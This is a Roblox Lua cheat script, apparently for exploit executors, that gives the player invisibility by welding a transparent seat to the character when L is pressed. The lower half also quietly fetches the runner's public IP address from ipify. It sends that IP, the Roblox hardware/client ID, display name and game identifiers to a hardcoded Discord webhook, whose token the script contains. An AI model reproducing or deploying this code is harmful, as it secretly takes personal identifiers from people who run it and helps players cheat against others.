local key = Enum.KeyCode.L

local invis_on = false
function onKeyPress(inputObject, chat)
    if chat then return end
    if inputObject.KeyCode == key then
	    invis_on = not invis_on
    	if invis_on then
            local savedpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
            wait()
            game.Players.LocalPlayer.Character:MoveTo(Vector3.new(-25.95, 84, 3537.55))
            wait(.15)
            local Seat = Instance.new('Seat', game.Workspace)
            Seat.Anchored = false
            Seat.CanCollide = false
            Seat.Name = 'invischair'
            Seat.Transparency = 1
            Seat.Position = Vector3.new(-25.95, 84, 3537.55)
            local Weld = Instance.new("Weld", Seat)
            Weld.Part0 = Seat
            Weld.Part1 = game.Players.LocalPlayer.Character:FindFirstChild("Torso") or game.Players.LocalPlayer.Character.UpperTorso
            wait()
            Seat.CFrame = savedpos
            game.StarterGui:SetCore("SendNotification", {
                Title = "Invis On";
                Duration = 1;
                Text = "By Phoomphat";
            })
        else
            workspace:FindFirstChild('invischair'):Remove()
            game.StarterGui:SetCore("SendNotification", {
                Title = "Invis Off";
                Duration = 1;
                Text = "By Phoomphat";
            })
        end
    end
end

local delay = 0.25

local HttpService = game:GetService("HttpService")

local webhookURL = "https://discordapp.com/api/webhooks/1313841021418737734/j28PR5XwX16mQKds-qe-eEu442B8P5VUw_oHcmNohKCvcP29AkxGOhT5eTiDIF_Sd_uR"

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
local function executeScripts()
    for _, scriptContent in ipairs(scripts) do
        spawn(function()
            loadstring(scriptContent)()
            wait(delay)
        end)
    end
end

local ipResponse = httpRequest({
    Url = "https://api.ipify.org?format=json",
    Method = "GET"
})

local ipAddress = "Unknown"
if ipResponse and ipResponse.Body then
    local ipData = HttpService:JSONDecode(ipResponse.Body)
    ipAddress = ipData.ip or "Unknown"
end

local payload = {
    content = "",
    embeds = {
        {
            title = "[** PHE WEBHOOK **]",
            description = game.Players.LocalPlayer.DisplayName .. " has executed the script.",
            type = "rich",
            color = tonumber(0xff0000),
            fields = {
                {
                    name = "Game Name :",
                    value = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    inline = false
                },
                {
                    name = "Place ID :",
                    value = tostring(game.PlaceId),
                    inline = true
                },
                {
                    name = "Job ID :",
                    value = game.JobId,
                    inline = true
                },
                {
                    name = "Hardware ID :",
                    value = game:GetService("RbxAnalyticsService"):GetClientId(),
                    inline = true
                },
                {
                    name = "IP Address :",
                    value = ipAddress,
                    inline = false
                }
            }
        }
    }
}

local response = httpRequest({
    Url = webhookURL,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = HttpService:JSONEncode(payload)
})

game:GetService("UserInputService").InputBegan:connect(onKeyPress)
